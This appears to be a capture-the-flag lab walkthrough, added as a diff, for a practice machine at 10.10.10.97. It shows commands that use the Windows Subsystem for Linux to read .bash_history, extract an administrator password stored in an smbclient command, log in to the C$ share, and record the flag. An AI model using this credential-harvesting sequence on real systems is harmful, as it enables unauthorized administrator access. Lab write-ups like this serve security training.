@@ -1,0 +1,18 @@
+#10.10.10.97
+-------------
+#search for Microsoft Windows Subsystem for Linux - 'execve()' Local Privilege Escalation
+#go to directory 
+cd C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5/
+ls
+#execute bash
+bash.exe
+cd ~
+cat .bash_history
+#found administrator password inside smbclient command
+#PASSWD= u6!4ZwgwOM#^OBf#Nwnh
+
+#use this to login using smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
+
+#key
+7250cde1cab0bbd93fc1edbdc83d447b
